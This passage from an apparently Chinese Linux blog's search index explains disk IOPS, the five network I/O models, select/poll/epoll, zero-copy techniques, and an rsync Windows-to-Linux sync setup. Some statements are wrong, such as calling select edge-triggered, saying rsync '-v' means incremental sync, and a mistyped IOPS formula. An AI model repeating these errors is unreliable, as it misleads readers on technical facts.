旋转延迟：是指将磁盘片旋转到数据所在的扇区到磁头下面所花费的时间，旋转延迟取决于磁盘的转速，通常使用磁盘旋转一周所 需要时间的1/2之一表示，比如7200转的磁盘平均训传延迟大约为60*1000/7200/2=4.17毫秒，公式的意思为 （每分钟60秒*1000毫秒每秒/7200转每分/2），如果是15000转的则为60*1000/15000/2=2毫秒。 数据传输时间：指的是读取到数据后传输数据的时间，主要取决于传输速率，这个值等于数据大小除以传输速率，目前的磁盘接口 每秒的传输速度可以达到600MB，因此可以忽略不计。 常见的机械磁盘平均寻道时间值： 7200转/分的磁盘平均物理寻道时间：9毫秒 10000转/分的磁盘平均物理寻道时间：6毫秒 15000转/分的磁盘平均物理寻道时间：4毫秒 常见磁盘的平均延迟时间： 7200转的机械盘平均延迟：60*1000/7200/2 = 4.17ms 10000转的机械盘平均延迟：60*1000/10000/2 = 3ms 15000转的机械盘平均延迟：60*1000/15000/2 = 2ms 每秒最大IOPS的计算方法： 7200转的磁盘IOPS计算方式：1000毫秒/(9毫秒的寻道时间+4.17毫秒的平均旋转延迟时间)=1000/13.13=75.9 IOPS 10000转的磁盘的IOPS计算方式：1000毫秒/(6毫秒的寻道时间+3毫秒的平均旋转延迟时间)=1000/9=111IOPS 15000转的磁盘的IOPS计算方式：15000毫秒/(4毫秒的寻道时间+2毫秒的平均旋转延迟时间)=1000/6=166.6 IOPS ","date":"2022-07-18","objectID":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/:1:0","tags":["I/O"],"title":"IO模型与零拷贝","uri":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/"},{"categories":["Linux"],"content":"网络 I/O 网络协议栈到用户空间进程的IO就是网络IO 网络I/O处理过程 获取请求数据，客户端与服务器建立连接发出请求，服务器接受请求（1-3） 构建响应，当服务器接收完请求，并在用户空间处理客户端的请求，直到构建响应完成（4） 返回数据，服务器将已构建好的响应再通过内核空间的网络 I/O 返回给客户端（5-7） 每次I/O都要经历的两个阶段 第一步：将数据从文件先加载至内核内存空间（缓冲区），等待数据准备完成，时间较长（网络数据拷贝） 第二步：将数据从内核缓冲区复制到用户空间的进程的内存中，时间较短（内存数据拷贝） I/O 模型 ","date":"2022-07-18","objectID":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/:2:0","tags":["I/O"],"title":"IO模型与零拷贝","uri":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/"},{"categories":["Linux"],"content":"I/O模型相关概念 同步/异步：关注的是消息通信机制，即调用者在等待一件事情的处理结果时，被调用者是否提供完成状态的通知。 同步：synchronous，被调用者并不提供事件的处理结果相关的通知消息，需要调用者主动询问事情是否处理完成 异步：asynchronous，被调用者通过状态、通知或回调机制主动通知调用者被调用者的运行状态 阻塞/非阻塞：关注调用者在等待结果返回之前所处的状态 阻塞：blocking，指IO操作需要彻底完成后才返回到用户空间，调用结果返回之前，调用者被挂起，干不了别的事情。 非阻塞：nonblocking，指IO操作被调用后立即返回给用户一个状态值，而无需等到IO操作彻底完成，在最终的调用结果返回之前，调用者不会被挂起，可以去做别的事情。 ","date":"2022-07-18","objectID":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/:3:0","tags":["I/O"],"title":"IO模型与零拷贝","uri":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/"},{"categories":["Linux"],"content":"网络 I/O 模型 阻塞型、非阻塞型、复用型、信号驱动型、异步 ","date":"2022-07-18","objectID":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/:4:0","tags":["I/O"],"title":"IO模型与零拷贝","uri":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/"},{"categories":["Linux"],"content":"阻塞型 I/O 模型（blocking IO） 阻塞IO模型是最简单的I/O模型，用户线程在内核进行IO操作时被阻塞。 用户线程通过系统调用read发起I/O读操作，由用户空间转到内核空间。内核等到数据包到达后，然后将接收的数据拷贝到用户空间，完成read操作。 用户需要等待read将数据读取到buffer后，才继续处理接收的数据。整个I/O请求的过程中，用户线程是被阻塞的，这导致用户在发起IO请求时，不能做任何事情，对CPU的资源利用率不够。 优点：程序简单，在阻塞等待数据期间进程/线程挂起，基本不会占用 CPU 资源。 缺点：每个连接需要独立的进程/线程单独处理，当并发请求量大时为了维护程序，内存、线程切换开销较大。 同步阻塞：程序向内核发送I/O请求后一直等待内核响应，如果内核处理请求的IO操作不能立即返回, 则进程将一直等待并不再接受新的请求，并由进程轮询查看I/O是否完成，完成后进程将I/O结果返回给Client，在IO没有返回期间进程不能接受其他客户的请求，而且是由进程自己去查看I/O是否完成，这种方式简单，但是比较慢，用的比较少。 ","date":"2022-07-18","objectID":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/:4:1","tags":["I/O"],"title":"IO模型与零拷贝","uri":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/"},{"categories":["Linux"],"content":"非阻塞 I/O 模型（nonblocking IO） 用户线程发起IO请求时立即返回。但并未读取到任何数据，用户线程需要不断地发起IO请求，直到数据到达后，才真正读取到数据，继续执行。即 “轮询”机制存在两个问题：如果有大量文件描述符都要等，那么就得一个一个read。这会带来大量的Context Switch（read是系统调用，每调用一次就得在用户态和核心态切换一次）。轮询的时间不好把握。这里需要估计数据需要多久之后才能准备好。等待时间设的太长，程序响应延迟就过大; 设的太短，就会造成过于频繁的重试，干耗CPU而已，是比较浪费CPU的方式，一般很少直接使用这种模型，而是在其他IO模型中使用非阻塞IO这一特性。 非阻塞：程序向内核发送请I/O求后一直等待内核响应，如果内核处理请求的IO操作不能立即返回IO结果，进程将不再等待，而是继续处理其他请求，但是仍然需要进程隔一段时间就要查看内核I/O是否完成。 由上图可知，在设置连接为非阻塞时，当应用进程系统调用 recvfrom 没有数据返回时，内核会立即返回一个 EWOULDBLOCK 错误，而不会一直阻塞到数据准备好。如上图在第四次调用时有一个数据报准备好了，所以这时数据会被复制到应用进程缓冲区 ，于是 recvfrom 成功返回数据。 当一个应用进程这样循环调用 recvfrom 时，称之为轮询 polling 。这么做往往会耗费大量CPU时间，这种模型实际很少被使用。 ","date":"2022-07-18","objectID":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/:4:2","tags":["I/O"],"title":"IO模型与零拷贝","uri":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/"},{"categories":["Linux"],"content":"多路复用 I/O 模 型（ I/O multiplexing ） 上面的模型中, 每一个文件描述符对应的IO均由一个线程监控和处理（有多少文件描述符就要生成多少个线程） 多路复用IO指一个线程可以同时（实际是交替实现，即并发完成）监控和处理多个文件描述符对应各自的IO，即复用同一个线程 一个线程之所以能实现同时处理多个IO, 是因为这个线程调用了内核中的SELECT, POLL或EPOLL等系统调用，从而实现多路复用IO I/O multiplexing 主要包括:select，poll，epoll三种系统调用，select/poll/epoll的好处就在于单个process（进程）就可以同时处理多个网络连接的IO。 它的基本原理就是select/poll/epoll这个function会不断的轮询所负责的所有socket，当某个socket有数据到达了，就通知用户进程。 当用户进程调用了select，那么整个进程会被block，而同时，kernel会“监视”所有select负责的socket，当任何一个socket中的数据准备好了，select就会返回。这个时候用户进程再调用read操作，将数据从kernel拷贝到用户进程。 IO多路复用（IO Multiplexing) ：是一种机制，程序注册一组socket文件描述符给操作系统，表示“我要监视这些fd是否有IO事件发生，有了就告诉程序处理”； IO多路复用一般和NIO（nonblocking IO）一起使用的。NIO和IO多路复用是相对独立的。NIO仅仅是指IO API总是能立刻返回，不会被Blocking; 而IO多路复用仅仅是操作系统提供的一种便利的通知机制。操作系统并不会强制这俩必须得一起用，可以只用IO多路复用 + BIO（blocking IO），这时还是当前线程被卡住。IO多路复用和NIO是要配合一起使用才有实际意义； IO多路复用是指内核一旦发现进程指定的一个或者多个IO条件准备就绪，就通知该进程； 多个连接共用一个等待机制，本模型会阻塞进程，但是进程是阻塞在select或者poll这两个系统调用上，而不是阻塞在真正的IO操作上； 用户首先将需要进行IO操作添加到select中，同时等待select系统调用返回。当数据到达时，IO被激活，select函数返回。用户线程正式发起read请求，读取数据并继续执行； 从流程上来看，使用select函数进行IO请求和同步阻塞模型没有太大的区别，甚至还多了添加监视IO，以及调用select函数的额外操作，效率更差。并且阻塞了两次，但是第一次阻塞在select上时，select可以监控多个IO上是否已有IO操作准备就绪，即可达到在同一个线程内同时处理多个IO请求的目的。而不像阻塞IO那种，一次只能监控一个IO； 虽然上述方式允许单线程内处理多个IO请求，但是每个IO请求的过程还是阻塞的（在select函数上阻塞），平均时间甚至比同步阻塞IO模型还要长。如果用户线程只是注册自己需要的IO请求，然后去做自己的事情，等到数据到来时再进行处理，则可以提高CPU的利用率； IO多路复用是最常使用的IO模型，但是其异步程度还不够“彻底”，因它使用了会阻塞线程的select系统调用。因此IO多路复用只能称为异步阻塞IO模型，而非真正的异步IO； 优缺点 优点：可以基于一个阻塞对象，同时在多个描述符上等待就绪，而不是使用多个线程(每个文件描述符一个线程)，这样可以大大节省系统资源 缺点：当连接数较少时效率相比多线程+阻塞 I/O 模型效率较低，可能延迟更大，因为单个连接处理需要 2 次系统调用（select和recvfrom），占用时间会有增加 IO多路复用适用如下场合： 当客户端处理多个描述符时（一般是交互式输入和网络套接口），必须使用I/O复用 当一个客户端同时处理多个套接字时，此情况可能的但很少出现 当一个服务器既要处理监听套接字，又要处理已连接套接字，一般也要用到I/O复用 当一个服务器即要处理TCP，又要处理UDP，一般要使用I/O复用 当一个服务器要处理多个服务或多个协议，一般要使用I/O复用 ","date":"2022-07-18","objectID":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/:4:3","tags":["I/O"],"title":"IO模型与零拷贝","uri":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/"},{"categories":["Linux"],"content":"信号驱动式 I/O 模型（signal-driven IO） 信号驱动I/O的意思就是进程现在不用傻等着，也不用去轮询。而是让内核在数据就绪时，发送信号通知进程。 调用的步骤是，通过系统调用 sigaction ，并注册一个信号处理的回调函数，该调用会立即返回，然后主程序可以继续向下执行，当有I/O操作准备就绪,即内核数据就绪时，内核会为该进程产生一个 SIGIO信号，并回调注册的信号回调函数，这样就可以在信号回调函数中系统调用 recvfrom 获取数据,将用户进程所需要的数据从内核空间拷贝到用户空间。此模型的优势在于等待数据报到达期间进程不被阻塞。用户主程序可以继续执行，只要等待来自信号处理函数的通知。 在信号驱动式 I/O 模型中，应用程序使用套接口进行信号驱动 I/O，并注册一个信号处理函数，进程继续运行并不阻塞，当数据准备好时，进程会收到一个 SIGIO 信号，可以在信号处理函数中调用 I/O 操作函数处理数据。 优点：线程并没有在等待数据时被阻塞，内核直接返回调用接收信号，不影响进程继续处理其他请求因此可以提高资源的利用率。 缺点：信号 I/O 在大量 IO 操作时可能会因为信号队列溢出导致没法通知。 异步阻塞：程序进程向内核发送IO调用后，不用等待内核响应，可以继续接受其他请求，内核收到进程请求后进行的IO如果不能立即返回，就由内核等待结果，直到IO完成后内核再通知进程。 ","date":"2022-07-18","objectID":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/:4:4","tags":["I/O"],"title":"IO模型与零拷贝","uri":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/"},{"categories":["Linux"],"content":"异步 I/O 模型（ asynchronous IO ） 异步I/O 与 信号驱动I/O最大区别在于，信号驱动是内核通知用户进程何时开始一个I/O操作，而异步I/O是由内核通知用户进程I/O操作何时完成，两者有本质区别在于异步IO相当于不用去饭店场吃饭，直接点个外卖，把等待上菜的时间也给省了。 相对于同步I/O，异步I/O不是顺序执行。用户进程进行aio_read系统调用之后，无论内核数据是否准备好，都会直接返回给用户进程，然后用户态进程可以去做别的事情。等到socket数据准备好了，内核直接复制数据给进程，然后从内核向进程发送通知。IO两个阶段，进程都是非阻塞的。 信号驱动IO当内核通知触发信号处理程序时，信号处理程序还需要阻塞在从内核空间缓冲区拷贝数据到用户空间缓冲区这个阶段，而异步IO直接是在第二个阶段完成后，内核直接通知用户线程可以进行后续操作了 优点：异步 I/O 能够充分利用 DMA 特性，让 I/O 操作与计算重叠 缺点：要实现真正的异步 I/O，操作系统需要做大量的工作。目前 Windows 下通过 IOCP 实现了真正的异步 I/O，在 Linux 系统下，Linux 2.6才引入，目前 AIO 并不完善，因此在 Linux 下实现高并发网络编程时以 IO 复用模型模式+多线程任务的架构基本可以满足需求 Linux提供了AIO库函数实现异步，但是用的很少。目前有很多开源的异步IO库，例如libevent、libev、libuv。 异步非阻塞：程序进程向内核发送IO调用后，不用等待内核响应，可以继续接受其他请求，内核调用的IO如果不能立即返回，内核会继续处理其他事物，直到IO完成后将结果通知给内核，内核在将IO完成的结果返回给进程，期间进程可以接受新的请求，内核也可以处理新的事物，因此相互不影响，可以实现较大的同时并实现较高的IO复用，因此异步非阻塞是使用最多的一种通信方式。 ","date":"2022-07-18","objectID":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/:4:5","tags":["I/O"],"title":"IO模型与零拷贝","uri":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/"},{"categories":["Linux"],"content":"五种 IO 对比 这五种 I/O 模型中，越往后，阻塞越少，理论上效率也是最优前四种属于同步 I/O，因为其中真正的 I/O 操作(recvfrom)将阻塞进程/线程，只有异步 I/O 模型才与 POSIX 定义的异步 I/O 相匹配。 ","date":"2022-07-18","objectID":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/:4:6","tags":["I/O"],"title":"IO模型与零拷贝","uri":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/"},{"categories":["Linux"],"content":"I/O 的具体实现方式 I/O 常见实现 Nginx支持在多种不同的操作系统实现不同的事件驱动模型，但是其在不同的操作系统甚至是不同的系统版本上面的实现方式不尽相同，主要有以下实现方式： 1、select： select库是在linux和windows平台都基本支持的 事件驱动模型库，并且在接口的定义也基本相同，只是部分参数的含义略有差异，最大并发限制1024，是最早期的事件驱动模型。 2、poll： 在Linux 的基本驱动模型，windows不支持此驱动模型，是select的升级版，取消了最大的并发限制，在编译nginx的时候可以使用--with-poll_module和--without-poll_module这两个指定是否编译select库。 3、epoll： epoll是库是Nginx服务器支持的最高性能的事件驱动库之一，是公认的非常优秀的事件驱动模型，它和select和poll有很大的区别，epoll是poll的升级版，但是与poll有很大的区别. epoll的处理方式是创建一个待处理的事件列表，然后把这个列表发给内核，返回的时候在去轮训检查这个表，以判断事件是否发生，epoll支持一个进程打开的最大事件描述符的上限是系统可以打开的文件的最大数，同时epoll库的I/O效率不随描述符数目增加而线性下降，因为它只会对内核上报的“活跃”的描述符进行操作。 4、kqueue： 用于支持BSD系列平台的高校事件驱动模型，主要用在FreeBSD 4.1及以上版本、OpenBSD 2.0级以上版本，NetBSD级以上版本及Mac OS X 平台上，该模型也是poll库的变种，因此和epoll没有本质上的区别，都是通过避免轮训操作提供效率。 5、Iocp： Windows系统上的实现方式，对应第5种（异步I/O）模型。 6、rtsig： 不是一个常用事件驱动，最大队列1024，不是很常用 7、/dev/poll: 用于支持unix衍生平台的高效事件驱动模型，主要在Solaris 平台、HP/UX，该模型是sun公司在开发Solaris系列平台的时候提出的用于完成事件驱动机制的方案，它使用了虚拟的/dev/poll设备，开发人员将要见识的文件描述符加入这个设备，然后通过ioctl()调用来获取事件通知，因此运行在以上系列平台的时候请使用/dev/poll事件驱动机制。 8、eventport： 该方案也是sun公司在开发Solaris的时候提出的事件驱动库，只是Solaris 10以上的版本，该驱动库看防止内核崩溃等情况的发生。 常用 I/O 模型比较 Select： POSIX所规定，目前几乎在所有的平台上支持，其良好跨平台支持也是它的一个优点，本质上是通过设置或者检查存放fd标志位的数据结构来进行下一步处理。 缺点： 单个进程能够监视的文件描述符的数量存在最大限制，在Linux上一般为1024，可以通过修改宏定义FD_SETSIZE，再重新编译内核实现，但是这样也会造成效率的降低 单个进程可监视的fd数量被限制，默认是1024，修改此值需要重新编译内核 对socket是线性扫描，即采用轮询的方法，效率较低 select 采取了内存拷贝方法来实现内核将 FD 消息通知给用户空间，这样一个用来存放大量fd的数据结构，这样会使得用户空间和内核空间在传递该结构时复制开销大 poll： 本质上和select没有区别，它将用户传入的数组拷贝到内核空间，然后查询每个fd对应的设备状态 其没有最大连接数的限制，原因是它是基于链表来存储的 大量的fd的数组被整体复制于用户态和内核地址空间之间，而不管这样的复制是不是有意义 poll特点是“水平触发”，如果报告了fd后，没有被处理，那么下次poll时会再次报告该fd select是边缘触发即只通知一次 epoll： 在Linux 2.6内核中提出的select和poll的增强版本 支持水平触发LT和边缘触发ET，最大的特点在于边缘触发，它只告诉进程哪些fd刚刚变为就绪态，并且只会通知一次 使用“事件”的就绪通知方式，通过epoll_ctl注册fd，一旦该fd就绪，内核就会采用类似callback的回调机制来激活该fd，epoll_wait便可以收到通知 优点: 没有最大并发连接的限制：能打开的FD的上限远大于1024(1G的内存能监听约10万个端口)，具体查看/proc/sys/fs/file-max，此值和系统内存大小相关 效率提升：非轮询的方式，不会随着FD数目的增加而效率下降;只有活跃可用的FD才会调用callback函数，即epoll最大的优点就在于它只管理“活跃”的连接，而跟连接总数无关 内存拷贝，利用mmap(Memory Mapping)加速与内核空间的消息传递;即epoll使用mmap减少复制开销 总结 1、epoll只是一组API，比起select这种扫描全部的文件描述符，epoll只读取就绪的文件描述符，再加入基于事件的就绪通知机制，所以性能比较好 2、基于epoll的事件多路复用减少了进程间切换的次数，使得操作系统少做了相对于用户任务来说的无用功。 3、epoll比select等多路复用方式来说，减少了遍历循环及内存拷贝的工作量，因为活跃连接只占总并发连接的很小一部分。 范例：最大并发连接数和内存有直接关系 #内存1G [root@centos8 ~]#free -h total used free shared buff/cache available Mem: 952Mi 168Mi 605Mi 12Mi 178Mi 629Mi Swap: 2.0Gi 0B 2.0Gi [root@centos8 ~]#cat /proc/sys/fs/file-max 92953 #内存2G [root@centos8 ~]#free -h total used free shared buff/cache available Mem: 1.9Gi 258Mi 1.3Gi 12Mi 341Mi 1.6Gi Swap: 2.0Gi 0B 2.0Gi [root@centos8 ~]#cat /proc/sys/fs/file-max 195920 范例：内核限制 [root@centos8 ~]#grep -R FD_SETSIZE linux-5.8/* linux-5.8/Documentation/userspace-api/media/v4l/func-select.rst: ``FD_SETSIZE``. linux-5.8/include/uapi/linux/posix_types.h:#undef __FD_SETSIZE linux-5.8/include/uapi/linux/posix_types.h:#define __FD_SETSIZE 1024 #单个进程能够 监视的文件描述符的文件最大数量 linux-5.8/include/uapi/linux/posix_types.h: unsigned long fds_bits[__FD_SETSIZE / (8 * sizeof(long))]; linux-5.8/tools/include/nolibc/nolibc.h:#define FD_SETSIZE 256 linux-5.8/tools/include/nolibc/nolibc.h:typedef struct { uint32_t fd32[FD_SETSIZE/32]; } fd_set; linux-5.8/tools/include/nolibc/nolibc.h: if (fd \u003c 0 || fd \u003e= FD_SETSIZE) linux-5.8/tools/testing/selftests/net/nettest.c: rc = select(FD_SETSIZE, NULL, \u0026wfd, NULL, tv); 范例：select 和 epoll 帮助 [root@centos8 ~]#whatis epoll epoll (7) - I/O event notification facility [root@centos8 ~]#whatis select select (2) - synchronous I/O multiplexing select (3) - synchronous I/O multiplexing select (3p) - synchronous I/O multiplexing [root@centos8 ~]#whatis poll poll (2) - wait for some event on a file descriptor poll (3p) - input/output multiplexing [root@centos8 ~]#man 2 select SELECT(2) Linux Programmer's Manual SELECT(2) NAME select, pselect, FD_CLR, FD_ISSET, FD_SET, FD_ZERO - synchronous I/O multiplexing [root@centos8 ~]#man 2 poll POLL(2) Linux Programmer's Manual POLL(2) NAME poll, ppoll - wait for some event on a file descriptor 零拷贝 ","date":"2022-07-18","objectID":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/:4:7","tags":["I/O"],"title":"IO模型与零拷贝","uri":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/"},{"categories":["Linux"],"content":"零拷贝介绍 ","date":"2022-07-18","objectID":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/:5:0","tags":["I/O"],"title":"IO模型与零拷贝","uri":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/"},{"categories":["Linux"],"content":"传统 Linux 的I/O 问题 传统的 Linux 系统的标准 I/O 接口（read、write）是基于数据拷贝的，也就是数据都是 copy_to_user 或者 copy_from_user，这样做的好处是，通过中间缓存的机制，减少磁盘 I/O 的操作，但是坏处也很明显，大量数据的拷贝，用户态和内核态的频繁切换，会消耗大量的 CPU 资源，严重影响数据传输的性能，统计表明，在Linux协议栈中，数据包在内核态和用户态之间的拷贝所用的时间甚至占到了数据包整个处理流程时间的57.1% 以上图为例，一次完整的网络请求涉及IO数据流向为：网络协议栈 –\u003e 内核空间 –\u003e 用户空间 –\u003e 内核空间 – \u003e 磁盘– \u003e 内核空间– \u003e 用户空间– \u003e 内核空间– \u003e 网络协议栈。可观察到一次IO过程，数据被拷贝了多次。 ","date":"2022-07-18","objectID":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/:5:1","tags":["I/O"],"title":"IO模型与零拷贝","uri":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/"},{"categories":["Linux"],"content":"什么是零拷贝 零拷贝就是上述问题的一个解决方案，通过尽量避免拷贝操作来缓解 CPU 的压力。零拷贝并没有真正做 到“0”拷贝，它更多是一种思想，很多的零拷贝技术都是基于这个思想去做的优化 ","date":"2022-07-18","objectID":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/:5:2","tags":["I/O"],"title":"IO模型与零拷贝","uri":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/"},{"categories":["Linux"],"content":"零拷贝相关技术 ","date":"2022-07-18","objectID":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/:6:0","tags":["I/O"],"title":"IO模型与零拷贝","uri":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/"},{"categories":["Linux"],"content":"MMAP ( Memory Mapping ) mmap()系统调用使得进程之间通过映射同一个普通文件实现共享内存。普通文件被映射到进程地址空间后，进程可以向访问普通内存一样对文件进行访问。 mmap是一种内存映射文件的方法，即将一个文件或者其它对象映射到进程的地址空间，实现文件磁盘地址和进程虚拟地址空间中一段虚拟地址的一一对映关系。 实现这样的映射关系后，进程就可以采用指针的方式读写操作这一段内存，而系统会自动回写脏页面到对应的文件磁盘上，即完成了对文件的操作而不必再调用read,write等系统调用函数。相反，内核空间对这段区域的修改也直接反映用户空间，从而可以实现不同进程间的文件共享。 内存映射减少数据在用户空间和内核空间之间的拷贝操作,适合大量数据传输。 以上图为例，网络请求到达内核空间（Socket缓存）后不再需要copy到用户空间，内存映射使得用户空间进程直接操作内核空间的数据，在处理完请求后，返回数据时也直接从内核空间（Kernerl缓存）拷贝到Socket缓存，再一次减少了内核空间与用户空间数据交换的过程。 上面左图为传统读写,右图为MMAP.两者相比mmap要比普通的read系统调用少了一次copy的过程。因为read调用，进程是无法直接访问kernel space的，所以在read系统调用返回前，内核需要将数据从内核复制到进程指定的buffer。但mmap之后，进程可以直接访问mmap的数据(page cache)。 ","date":"2022-07-18","objectID":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/:6:1","tags":["I/O"],"title":"IO模型与零拷贝","uri":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/"},{"categories":["Linux"],"content":"SENDFIRL 实现效果与MMAP类似，减少了用户空间和内存空间的上下文切换（数据拷贝） ","date":"2022-07-18","objectID":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/:6:2","tags":["I/O"],"title":"IO模型与零拷贝","uri":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/"},{"categories":["Linux"],"content":"DMA 辅助的 SENDFILE Kernel 到 Sockert 只需要传输文件描述符，而数据直接通过DMA拷贝到网络协议栈。 ","date":"2022-07-18","objectID":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/:6:3","tags":["I/O"],"title":"IO模型与零拷贝","uri":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/"},{"categories":["数据同步"],"content":"利用rsync实现windows定时向linux同步数据（增量同步） windows同步Linux数据 1、Linux安装rsync服务端 yum -y install rsync 准备配置文件 vim /etc/rsyncd.conf uid = root gid = root use chroot = no max connections = 2 pid file = /var/run/rsyncd.pid exclude = lost+found/ transfer logging = yes timeout = 900 ignore nonreadable = yes dont compress = *.gz *.tgz *.zip *.z *.Z *.rpm *.deb *.bz2 [rsync] path = /data/mysql/backup hosts allow = 172.20.20.0/24 auth user = rsync secrets file = /etc/rsync.txt read only = yes #配置文件详解 [rsync] #是同步目录的一个别名，path对应实际数据所在路径 hosts.allow #哪个网络内的主机可访问该服务 secrets file #账户认证文件路径，该文件存放了自定义的用于同步的账号信息（格式为：账号：密码，多个账号写多行即可） read only = yes #表示客户端只能下载服务端的文件而不能上传(单向同步) 这应该是大部分业务的需求,如果有上传需要,设置read only = no 即可 #准备账号认证文件 vim /etc/rsync.txt chmod 600 /etc/rsync.txt #此步骤必须，否则客户端同步时会提示auth failed echo \"rsync:passwd\" \u003e /etc/rsync.txt #启动服务 systemctl enable rsyncd --now 2、windows安装rsync客户端 下载地址：https://itefix.net/dl/free-software/cwrsync_6.2.4_x64_free.zip 解压到指定目录后将bin目录的路径添加到path环境变量完成安装 3、windows客户端同步命令 rsync --list-only rsync@172.20.20.20::rsync --password-file=/cygdrive/d/rsyncpwd.txt #查看服务端有哪些数据 rsync -av --delete rsync@172.20.20.20::rsync /cygdrive/d/mysql_backup/ --password-file=/cygdrive/d/rsyncpwd.txt 注意：/cygdrive/d/mysql_backup/ #该写法表示路径(本地数据存放路径）：D:\\mysql_bakcup\\ 相关参数： --delete 表示删除本地tmpfolder目录中跟服务器test01下不一致的所有文件和目录 --password 指定存放了密码的文件路径（用于非交互式同步数据） -v 表示采用增量的方式同步文件 -a 是 archive mode; same as -rlptgoD; 相当于简写了很多参数 -u, --update 忽略客户端上(比服务端)更加新的文件 -r, --recursive 递归同步目录 -z, --compress 传输时压缩文件数据 4、windows设置计划任务，定时同步数据： 脚本内容： @echo off rsync -av --delete 172.20.20.20::rsync /cygdrive/d/mysql_backup/ --password-file=/cygdrive/d/rsyncpwd.txt ","date":"2022-07-11","objectID":"/posts/data_sync/windows%E5%90%91linux%E5%90%8C%E6%AD%A5%E6%95%B0%E6%8D%AE/:0:0","tags":["rsync"],"title":"windows向linux同步数据","uri":"/posts/data_sync/windows%E5%90%91linux%E5%90%8C%E6%AD%A5%E6%95%B0%E6%8D%AE/"}]